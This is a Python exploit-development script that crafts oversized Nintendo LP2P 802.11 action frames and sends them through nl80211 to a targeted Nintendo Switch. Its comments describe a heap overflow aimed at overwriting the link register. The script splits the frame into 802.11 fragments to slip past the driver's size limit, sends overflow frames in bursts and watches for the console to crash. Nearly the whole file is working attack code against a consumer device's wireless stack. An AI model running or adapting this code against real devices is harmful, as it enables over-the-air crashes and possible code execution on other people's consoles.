#!/usr/bin/env python3
"""Test 802.11 fragmented action frame delivery to Nintendo Switch.

The iwlwifi driver limits NL80211_CMD_FRAME to body_size=0x800 (2048 bytes).
We need body_size=0xAA6 (2726 bytes) for the partial LR overwrite.

Hypothesis: If we send the action frame as multiple 802.11 fragments,
the Switch's BCM43455 WiFi chip will reassemble them into the full frame.
Each fragment is under the 0x800 limit individually.

802.11 fragmentation:
  - Frame Control bit 2 (More Fragments) = 1 for all but last fragment
  - Sequence Control: bits 3-0 = fragment number, bits 15-4 = sequence number
  - Each fragment has the same SA/DA/BSSID and sequence number
  - Fragments arrive in order with incrementing fragment number

NOTE: 802.11 standard says management frames SHALL NOT be fragmented.
But many WiFi chips reassemble based on fragment flags regardless of type.
"""

import os
import struct
import socket
import time
import subprocess

IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
FRAG_SIZE = 700  # bytes per fragment (well under 0x800)

LP2P_HEADER = (
    b"\x7f"           # Category: Vendor Specific
    b"\x00\x22\xaa"   # Nintendo OUI
    b"\x04"           # Type
    b"\x01"           # Version
    b"\x01\x01"       # frame_type = ADVERTISE
    b"\x00\x00\x00\x00"  # reserved
)


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla) % 4:
        nla += b'\x00' * (4 - len(nla) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + len(frame_bytes)
    s.bind((pid, 0))
    s.settimeout(2.0)

    genlhdr = struct.pack('BBH', 59, 0, 0)  # NL80211_CMD_FRAME
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)

    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_type3_body(body_size, payload_size=0x0100, fill=0x41):
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, payload_size)
    for i in range(0x1DC, body_size):
        body[i] = fill
    return bytes(body)


def build_full_frame(body):
    """Build the complete unfragmented action frame."""
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)  # Frame Control: Action, no flags
    frame += b"\x00\x00"               # Duration
    frame += SWITCH_MAC                 # DA
    frame += SRC_MAC                    # SA
    frame += SWITCH_MAC                 # BSSID
    frame += struct.pack('<H', 0x0000)  # Seq ctrl (will be set per-fragment)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def fragment_frame(full_frame, frag_size, seq_num=0x100):
    """Split a full MAC frame into 802.11 fragments.

    Each fragment has:
      - Same addresses (DA/SA/BSSID)
      - Frame Control with More Fragments bit set (except last)
      - Sequence Control: same seq number, incrementing frag number
      - Fragment payload: portion of the frame body (after MAC header)
    """
    mac_header_len = 24  # fixed for action frames (no QoS, no HT control)
    mac_header = bytearray(full_frame[:mac_header_len])
    body = full_frame[mac_header_len:]

    fragments = []
    offset = 0
    frag_num = 0

    while offset < len(body):
        end = min(offset + frag_size, len(body))
        is_last = (end >= len(body))

        frag_header = bytearray(mac_header)

        # Set More Fragments bit in Frame Control (bit 2 of byte 1)
        fc = struct.unpack_from('<H', frag_header, 0)[0]
        if not is_last:
            fc |= 0x0400  # More Fragments (FC bit 10 = byte offset 1, bit 2)
        else:
            fc &= ~0x0400
        struct.pack_into('<H', frag_header, 0, fc)

        # Set Sequence Control: seq_num in upper 12 bits, frag_num in lower 4
        seq_ctrl = ((seq_num & 0xFFF) << 4) | (frag_num & 0x0F)
        struct.pack_into('<H', frag_header, 22, seq_ctrl)

        frag = bytes(frag_header) + body[offset:end]
        fragments.append(frag)

        offset = end
        frag_num += 1

    return fragments


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def main():
    import errno

    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE} (ifindex={ifindex})")
    print(f"nl80211 family: {fam_id}")
    print()

    # Phase 1: Test if NL80211 accepts fragmented frames
    print("=" * 60)
    print("  802.11 FRAGMENTATION TEST")
    print("=" * 60)

    # Build a small test frame and fragment it
    test_body = build_type3_body(0x400, payload_size=0x100)
    test_frame = build_full_frame(test_body)
    print(f"\nTest frame: {len(test_frame)} bytes total, body={len(test_body)} bytes")

    frags = fragment_frame(test_frame, FRAG_SIZE)
    print(f"Fragments: {len(frags)} x ~{FRAG_SIZE} bytes")
    for i, f in enumerate(frags):
        fc = struct.unpack_from('<H', f, 0)[0]
        sc = struct.unpack_from('<H', f, 22)[0]
        more = (fc >> 10) & 1
        fnum = sc & 0xF
        snum = (sc >> 4) & 0xFFF
        print(f"  Frag {i}: {len(f)}B, FC=0x{fc:04x}, seq={snum}, frag={fnum}, more={more}")

    print("\n[*] Sending unfragmented test frame (baseline)...")
    err = send_frame(fam_id, ifindex, test_frame)
    print(f"    Unfragmented: err={err} {'OK' if err == 0 else errno.errorcode.get(-err, str(err))}")

    print("\n[*] Sending fragments individually...")
    for i, frag in enumerate(frags):
        err = send_frame(fam_id, ifindex, frag)
        ename = errno.errorcode.get(-err, str(err)) if isinstance(err, int) and err != 0 else ""
        print(f"    Fragment {i}: {len(frag)}B → err={err} {ename}")
        time.sleep(0.001)

    # Phase 2: Test with the full exploit-size frame
    print("\n" + "=" * 60)
    print("  FULL-SIZE FRAGMENTED FRAME TEST")
    print("=" * 60)

    target_body_size = 0xAA6  # minimum for partial LR overwrite
    full_body = build_type3_body(target_body_size, payload_size=0x8CA, fill=0x42)
    full_frame = build_full_frame(full_body)
    print(f"\nFull frame: {len(full_frame)} bytes total, body={len(full_body)} bytes")

    frags = fragment_frame(full_frame, FRAG_SIZE)
    print(f"Fragments: {len(frags)} x ~{FRAG_SIZE} bytes")

    # Check Switch is alive
    alive = check_alive()
    print(f"\nSwitch HTTP: {'UP' if alive else 'DOWN'}")
    if not alive:
        print("[!] Switch not reachable, aborting")
        return

    print(f"\n[*] Sending {len(frags)} fragments...")
    all_ok = True
    for i, frag in enumerate(frags):
        err = send_frame(fam_id, ifindex, frag)
        ename = errno.errorcode.get(-err, str(err)) if isinstance(err, int) and err != 0 else "OK"
        print(f"    Fragment {i}: {len(frag)}B → {ename}")
        if err != 0:
            all_ok = False
        time.sleep(0.002)

    if all_ok:
        print("\n[+] All fragments accepted by kernel!")
        print("[*] Checking if Switch received the reassembled frame...")
        time.sleep(2)
        alive_after = check_alive()
        ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                              capture_output=True).returncode == 0
        print(f"    HTTP: {'UP' if alive_after else 'DOWN'}")
        print(f"    Ping: {'OK' if ping else 'FAIL'}")
        if not alive_after:
            print("\n  *** POSSIBLE CRASH FROM REASSEMBLED FRAGMENT! ***")
            print("  *** Fragmentation bypass may work! ***")
    else:
        print("\n[-] Some fragments rejected — fragmentation not supported via NL80211")
        print("    May need raw socket or monitor mode injection")

    # Phase 3: Try different fragment sizes
    print("\n" + "=" * 60)
    print("  ALTERNATIVE: MAXIMUM NON-FRAGMENTED FRAME")
    print("=" * 60)

    # Try the maximum body size (0x800) with payload_size=0x8CA
    # Even though controlled data only reaches offset 0x624,
    # test if the uncontrolled bytes are deterministic
    print("\n[*] Testing deterministic heap data...")
    max_body = build_type3_body(0x800, payload_size=0x8CA, fill=0x00)
    max_frame = build_full_frame(max_body)
    print(f"    Frame: {len(max_frame)} bytes, body=0x800, payload_size=0x8CA")
    print(f"    Controlled payload: 0x624 bytes (zeros)")
    print(f"    Uncontrolled (heap): 0x2A6 bytes → includes LR at offset 0x8C8")

    # Send 10 times and observe if crash timing is consistent
    results = []
    for trial in range(3):
        if not check_alive():
            print(f"    Trial {trial}: Switch DOWN, waiting 20s...")
            time.sleep(20)
            if not check_alive():
                print(f"    Still down, skipping remaining trials")
                break
            continue

        print(f"\n    Trial {trial}: Sending overflow frame...")
        for _ in range(50):
            send_frame(fam_id, ifindex, max_frame)
            time.sleep(0.002)

        time.sleep(3)
        alive = check_alive()
        ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                              capture_output=True).returncode == 0
        result = "UP" if alive else ("CRASH" if not ping else "HTTP_DOWN")
        results.append(result)
        print(f"    Trial {trial}: {result}")
        if not alive:
            time.sleep(15)

    print(f"\n    Results: {results}")
    if all(r == results[0] for r in results) and len(results) > 1:
        print(f"    Consistent: heap data at LR position is likely deterministic")
    else:
        print(f"    Variable: heap data at LR position changes between runs")


if __name__ == "__main__":
    main()
